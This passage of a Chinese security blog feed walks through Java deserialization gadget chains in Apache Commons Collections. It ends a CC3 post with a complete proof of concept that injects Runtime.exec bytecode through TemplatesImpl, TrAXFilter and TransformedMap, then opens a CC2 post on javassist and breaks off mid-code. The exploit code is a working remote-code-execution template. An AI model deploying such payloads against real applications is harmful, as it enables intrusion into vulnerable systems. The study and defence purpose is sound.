title="CC3延伸TransformedMap"></a>CC3延伸TransformedMap</h2><p>上述的CC3-POC主要还是加载字节码+LazyMap，在CC1链学习中学到CC1链有LazyMap链还有一条TransformedMap链，且加载字节码主体不变，触发方式也是去调用ChainedTransformer的串联方法。那也同理，可以使用TransformedMap链作为入口点。</p><p>构造POC：<br>同理，加载字节码主体不变，直接搬过来</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建CtClass对象容器</span></span><br><span class="line">ClassPool pool2=ClassPool.getDefault();</span><br><span class="line"><span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line"><span class="comment">//创建新类Exp2</span></span><br><span class="line">CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line"><span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line"><span class="comment">//创建构造函数</span></span><br><span class="line">CtConstructor cons2=ct.makeClassInitializer();</span><br><span class="line"><span class="comment">//向构造函数插入字节码</span></span><br><span class="line">cons2.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line"><span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line"><span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line"><span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line"><span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">TemplatesImpl templates=TemplatesImpl.class.newInstance();</span><br><span class="line"><span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,bytecodes);</span><br><span class="line"><span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="comment">//设置满足条件属性_tfactory实例化</span></span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br></pre></td></tr></table></figure><p>加载字节码有了，现在就是触发字节码的部分，也是ChainedTransformer类的串联方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//串联TrAXFilter类和InstantiateTransformer类。</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="comment">//获取TrAXFilter类对象</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        <span class="comment">//调用InstantiateTransformer方法，实例化TrAXFilter对象，并执行TransformerImpl.newTransformer()方法</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>触发方式有了，现在就是找到反序列化入口，即CC1的TransformedMap入口</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">tmap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, transformerChain);</span><br><span class="line"><span class="comment">//反射获取AnnotationInvocationHandler的对象传入tmap</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> declaredConstructor.newInstance(Generated.class, tmap);</span><br></pre></td></tr></table></figure><p>最后就是对obj对象进行序列化和反序列化触发利用。</p><p>得到完整代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//创建CtClass对象容器</span></span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line">        <span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">        ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        CtConstructor cons2=ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons2.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line">        <span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">        TemplatesImpl templates=TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,bytecodes);</span><br><span class="line">        <span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_tfactory实例化</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//串联TrAXFilter类和InstantiateTransformer类。</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取TrAXFilter类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="comment">//调用InstantiateTransformer方法，实例化TrAXFilter对象，并执行TransformerImpl.newTransformer()方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//使用TransformedMap链作为序列化入口</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">tmap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        <span class="comment">//反射获取AnnotationInvocationHandler的对象传入tmap</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> declaredConstructor.newInstance(Generated.class, tmap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc3payload-2.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(obj);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc3payload-2.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/a9d24d12/cc3-8.png" title="执行实现"></p><h1 id="0x04、总结"><a href="#0x04、总结" class="headerlink" title="0x04、总结"></a>0x04、总结</h1><p>主要还是变式吧，cc1和cc2的结合，并找到了新的两个类<code>TrAXFilter</code>、<code>InstantiateTransformer</code>串联进行执行，采用cc1的LazyMap和cc2的字节码实例化，相对理解起来轻松很多，同理也可以使用cc1的TransformedMap利用链改变入口点，进行再次变式，原理上差不多，接着后面链学习吧。</p><h1 id="0x05、参考链接"><a href="#0x05、参考链接" class="headerlink" title="0x05、参考链接"></a>0x05、参考链接</h1><p><a href="https://paper.seebug.org/1242/#commons-collections-3">https://paper.seebug.org/1242/#commons-collections-3</a><br>java漫谈</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> java利用链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java利用链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-CC2链学习与分析</title>
      <link href="/posts/7e30cd4a.html"/>
      <url>/posts/7e30cd4a.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>针对CC链的分析，主要还是以逆向思维为主（从结果分析过程），从中尽可能学习出问题的地方在哪，哪里调用的这个带问题的地方，一步步思考。<br>这次的学习顺序是先PriorityQueue优先级队列——&gt;CC2链学习分析——&gt;javassist字节码增强类——&gt;ClassLoader#defineClass定义类——&gt;TemplatesImpl模板转换——&gt;cc2-yso链学习与分析</p><h1 id="0x01、Apache-Commons-Collections描述"><a href="#0x01、Apache-Commons-Collections描述" class="headerlink" title="0x01、Apache Commons Collections描述"></a>0x01、Apache Commons Collections描述</h1><p>引用CC1链分析中的描述<br>CC链即Commons Collections利用链，主要针对Commons Collections组件发现的利用链。</p><blockquote><p>Apache Commons是Apache软件基金会的项目。Commons的目的是提供可重用的、开源的Java代码。<br>Apache Commons提供了很多工具类库，他们几乎不依赖其他第三方的类库，接口稳定，集成简单，可以大大提高编码效率和代码质量。<br>Apache Commons Collections 是对 java.util.Collection 的扩展。<br>Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p></blockquote><p>目前 Collections 包有两个 commons-collections 和commons-collections4，commons-collections 最新版本是3.2.2，3系列版本也是只有3.2.2是安全的，不支持泛型，目前官方已不在维护。collections4 目前最新版本是4.4，其中4.0是存在漏洞，最低要求 Java8 以上。相对于 collections 来说完全支持 Java8 的特性并且支持泛型，该版本无法兼容旧有版本，于是为了避免冲突改名为 collections4。推荐直接使用该版本。（注：两个版本可以共存，使用时需要注意）</p><h1 id="0x02、环境准备"><a href="#0x02、环境准备" class="headerlink" title="0x02、环境准备"></a>0x02、环境准备</h1><p>java版本：jdk8u66（要求java8以上）<br>Commons Collections：4.0（漏洞版本）（在3版本中<code>TransformingComparator</code>类未实现序列化接口所以不存在该利用链，4版本才实现）<br>javassist：3.20.0-GA<br>maven项目pom.xml文件中添加依赖</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">4.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">3.20</span><span class="number">.0</span>-GA&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>在idea访问<code>Commons Collections</code>组件的文件时候点击上方的下载源代码就可以看到对应文件的.java文件了</p><h1 id="0x03、利用链基础前提"><a href="#0x03、利用链基础前提" class="headerlink" title="0x03、利用链基础前提"></a>0x03、利用链基础前提</h1><h2 id="javassist字节码增强类"><a href="#javassist字节码增强类" class="headerlink" title="javassist字节码增强类"></a>javassist字节码增强类</h2><p>Java 字节码以二进制的形式存储在 class 文件中，每一个 class 文件包含一个 Java 类或接口。Javaassist 就是一个用来处理 Java 字节码的类库。</p><blockquote><p>引用官网的描述：<br>Javassist（Java编程助手）使Java字节码操作变得简单。它是一个用于在Java中编辑字节码的类库；它使Java程序能够在运行时定义一个新类，并在JVM加载时修改类文件。与其他类似的字节码编辑器不同，Javassist提供了两级API：源代码级和字节码级。如果用户使用源代码级API，他们可以在不知道Java字节码规范的情况下编辑类文件。整个API仅使用Java语言的词汇表设计。您甚至可以以源文本的形式指定插入的字节码；Javassist实时编译。另一方面，字节码级API允许用户像其他编辑器一样直接编辑类文件。</p></blockquote><p>由于<code>java</code>运行通常由<code>java</code>文件编译成<code>class</code>文件供<code>jvm</code>运行，更改代码内容需要重新编写<code>java</code>文件再编译成<code>class</code>文件运行。<br><strong><code>Javassist</code>作用就是动态修改<code>.class</code>文件内容</strong>，且不需要知道<code>jvm</code>相关指令调用，<code>javassist</code>的引用能更简单快速的修改<code>class</code>文件的内容。</p><p>实现的效果有点类似反射的调用方式，不过一个是更改字节文件，反射是调用类，目的不同。</p><p><strong>涉及的类</strong></p><h3 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h3><p>ClassPool：<br>基于哈希表(Hashtable)实现的CtClass对象容器，其中键是类名称, 值是表示该类的CtClass对象，同HashMap实现的Map接口，但不同于哈希表(Hashtable)的键名不能为null。<br>常用方法：</p><table><thead><tr><th align="left">常用方法</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">getDefault()</td><td align="left">返回默认的类池（默认的类池搜索系统搜索路径，通常包括平台库、扩展库以及由-classpath选项或CLASSPATH环境变量指定的搜索路径）</td></tr><tr><td align="left">insertClassPath(java.lang.String pathname)</td><td align="left">在搜索路径的开头插入目录或jar（或zip）文件</td></tr><tr><td align="left">insertClassPath(ClassPath cp)</td><td align="left">在搜索路径的开头插入类对象，当用户系统存在多个类加载器，默认加载getDefault()搜索不到加载类可使用该方法添加路径</td></tr><tr><td align="left">getClassLoader()</td><td align="left">获得类加载器</td></tr><tr><td align="left">get(java.lang.String classname)</td><td align="left">从源中读取类文件，并返回对CtClass 表示该类文件的对象的引用</td></tr><tr><td align="left">getOrNull(java.lang.String classname)</td><td align="left">从源中读取类文件，并返回对CtClass 表示该类文件的对象的引用，未找到该文件返回null，不抛出异常</td></tr><tr><td align="left">appendClassPath(ClassPath cp)</td><td align="left">将ClassPath对象附加到搜索路径的末尾</td></tr><tr><td align="left">makeClass(java.lang.String classname)</td><td align="left">创建一个新的public类</td></tr></tbody></table><p>实现方式：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//两种ClassPool创建方法</span></span><br><span class="line">        ClassPool pool=<span class="keyword">new</span> <span class="title class_">ClassPool</span>(<span class="literal">true</span>);</span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="CtClass"><a href="#CtClass" class="headerlink" title="CtClass"></a>CtClass</h3><p>CtClass表示类, 一个CtClass(编译时类)对象可以处理一个class文件, 这些CtClass对象可以从ClassPool获得。<br>常用方法：</p><table><thead><tr><th align="left">常用方法</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">setSuperclass(CtClass clazz)</td><td align="left">添加父类</td></tr><tr><td align="left">setInterfaces</td><td align="left">添加父类接口</td></tr><tr><td align="left">toClass(java.lang.invoke.MethodHandles.Lookup lookup)</td><td align="left">将此类转换为java.lang.Class对象</td></tr><tr><td align="left">toBytecode()</td><td align="left">将该类转换为类文件，对象类型为byte[]</td></tr><tr><td align="left">writeFile()</td><td align="left">将由此CtClass 对象表示的类文件写入当前目录</td></tr><tr><td align="left">writeFile(java.lang.String directoryName)</td><td align="left">将由此CtClass 对象表示的类文件写入本地磁盘</td></tr><tr><td align="left">makeClassInitializer()</td><td align="left">制作一个空的类初始化程序（静态构造函数），对象类型为CtConstructor</td></tr><tr><td align="left">detach</td><td align="left">将CtClass对象从ClassPool池中删除</td></tr><tr><td align="left">freeze</td><td align="left">冻结一个类，使其变为不可修改状态</td></tr><tr><td align="left">isfreeze</td><td align="left">判断该类是否存于冻结状态</td></tr><tr><td align="left">prune</td><td align="left">删除类不必要的属性，减少内存占用</td></tr><tr><td align="left">deforst</td><td align="left">解冻一个类，使其变为可修改状态</td></tr><tr><td align="left">addField</td><td align="left">添加字段</td></tr><tr><td align="left">addMethod</td><td align="left">添加方法</td></tr><tr><td align="left">addConstructor</td><td align="left">添加构造器</td></tr><tr><td align="left">addInterface</td><td align="left">添加接口</td></tr></tbody></table><p>实现方式：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//两种ClassPool创建方法 效果相同</span></span><br><span class="line">        ClassPool pool=<span class="keyword">new</span> <span class="title class_">ClassPool</span>(<span class="literal">true</span>);</span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//获取类Exp</span></span><br><span class="line">        CtClass ct=pool2.get(<span class="string">&quot;cc2.People&quot;</span>);</span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct2=pool.makeClass(<span class="string">&quot;cc2.People2&quot;</span>);</span><br><span class="line">        <span class="comment">//创建新方法</span></span><br><span class="line">        ct.addMethod(<span class="string">&quot;show&quot;</span>)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="CtMethods"><a href="#CtMethods" class="headerlink" title="CtMethods"></a>CtMethods</h3><p>表示类中的方法</p><table><thead><tr><th align="left">常用方法</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">insertBefore</td><td align="left">在方法起始位置插入代码</td></tr><tr><td align="left">insterAfter</td><td align="left">在方法的所有 return 语句前插入代码以确保语句能够被执行，除非遇到exception</td></tr><tr><td align="left">insertAt</td><td align="left">在指定位置插入代码</td></tr><tr><td align="left">setBody</td><td align="left">将方法的内容设置为要写入的代码，当方法被 abstract修饰时，该修饰符被移除</td></tr><tr><td align="left">make</td><td align="left">创建一个方法</td></tr><tr><td align="left">addParameter</td><td align="left">添加参数</td></tr><tr><td align="left">setName</td><td align="left">设置方法名</td></tr></tbody></table><p>注:插入的代码必须是完整的代码语句，包括分号结束语。</p><p>实现方法：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//两种ClassPool创建方法</span></span><br><span class="line">        ClassPool pool=<span class="keyword">new</span> <span class="title class_">ClassPool</span>(<span class="literal">true</span>);</span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取类Exp</span></span><br><span class="line">        CtClass ct=pool2.get(<span class="string">&quot;cc2.People&quot;</span>);</span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct2=pool2.makeClass(<span class="string">&quot;cc2.People2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//对类的方法进行操作</span></span><br><span class="line">        CtMethod ctm=ct.getDeclaredMethod(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        ctm.insertBefore(<span class="string">&quot;System.out.println(\&quot;使用javassist对getName方法插入了代码\&quot;);&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/7e30cd4a/cc2-1.png" title="实现方法"></p><h3 id="CtConstructor"><a href="#CtConstructor" class="headerlink" title="CtConstructor"></a>CtConstructor</h3><p>表示类中的构造函数<br>实现方法：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//两种ClassPool创建方法</span></span><br><span class="line">        ClassPool pool=<span class="keyword">new</span> <span class="title class_">ClassPool</span>(<span class="literal">true</span>);</span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取类Exp</span></span><br><span class="line">        CtClass ct=pool2.get(<span class="string">&quot;Exp&quot;</span>);</span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct2=pool.makeClass(<span class="string">&quot;Exp2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        CtConstructor cons=ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons.insertBefore(<span class="string">&quot;System.out.println(\&quot;使用javassist调用了构造方法\&quot;);&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="生成字节码toBytecode"><a href="#生成字节码toBytecode" class="headerlink" title="生成字节码toBytecode()"></a>生成字节码toBytecode()</h3><p>生成字节码：CtClass.toBytecode()</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//生成字节码</span></span><br><span class="line"><span class="type">byte</span>[] bt=ct.toBytecode();</span><br><span class="line"><span class="comment">//输出字节码</span></span><br><span class="line">String str=Arrays.toString(bt);</span><br><span class="line">System.out.print(str);</span><br></pre></td></tr></table></figure><p><img src="/posts/7e30cd4a/cc2-4.png" title="toBytecode()"></p><h3 id="生成对象toClass"><a href="#生成对象toClass" class="headerlink" title="生成对象toClass()"></a>生成对象toClass()</h3><p>反射调用对象:CtClass.toClass()</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过反射调用对象</span></span><br><span class="line">Class cla=ct.toClass();</span><br><span class="line"><span class="comment">//实例化对象</span></span><br><span class="line">Object o=cla.newInstance();</span><br></pre></td></tr></table></figure><h3 id="简单实现demo"><a href="#简单实现demo" class="headerlink" title="简单实现demo"></a>简单实现demo</h3><p>实例类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">People</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> String name;</span><br><span class="line">   <span class="keyword">private</span> String addr;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">       <span class="built_in">this</span>.name=name;</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAddr</span><span class="params">(String addr)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.addr=addr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">       <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAddr</span><span class="params">()</span>&#123;</span><br><span class="line">       <span class="keyword">return</span> addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="comment">//两种ClassPool创建方法</span></span><br><span class="line">       ClassPool pool=<span class="keyword">new</span> <span class="title class_">ClassPool</span>(<span class="literal">true</span>);</span><br><span class="line">       ClassPool pool2=ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">       <span class="comment">//获取类Exp</span></span><br><span class="line">       CtClass ct=pool2.get(<span class="string">&quot;cc2.People&quot;</span>);</span><br><span class="line">       <span class="comment">//创建新类Exp2</span></span><br><span class="line">       CtClass ct2=pool2.makeClass(<span class="string">&quot;cc2.People2&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//对类的方法进行操作</span></span><br><span class="line">       CtMethod ctm=ct.getDeclaredMethod(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">       ctm.insertBefore(<span class="string">&quot;System.out.println(\&quot;使用javassist对getName方法插入了代码\&quot;);&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//创建构造函数</span></span><br><span class="line">       CtConstructor cons=ct.makeClassInitializer();</span><br><span class="line">       <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">       cons.insertBefore(<span class="string">&quot;System.out.println(\&quot;使用javassist调用了构造方法\&quot;);&quot;</span>);</span><br><span class="line">       ct.defrost();</span><br><span class="line">       ct.writeFile(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>实现更改字节码效果：</p><p><img src="/posts/7e30cd4a/cc2-2.png" title="实现效果"></p><p>触发恶意代码效果demo:<br>通过向构造函数插入执行代码，通过反射调用CtClass对象并转换为反射类对象，进行实例化的时候调用构造函数触发恶意代码。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="comment">//两种ClassPool创建方法</span></span><br><span class="line">       ClassPool pool=<span class="keyword">new</span> <span class="title class_">ClassPool</span>(<span class="literal">true</span>);</span><br><span class="line">       ClassPool pool2=ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">       <span class="comment">//获取类Exp</span></span><br><span class="line">       CtClass ct=pool2.get(<span class="string">&quot;cc2.People&quot;</span>);</span><br><span class="line">       <span class="comment">//创建新类Exp2</span></span><br><span class="line">       CtClass ct2=pool2.makeClass(<span class="string">&quot;cc2.People2&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//对类的方法进行操作</span></span><br><span class="line">       CtMethod ctm=ct.getDeclaredMethod(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">       ctm.insertBefore(<span 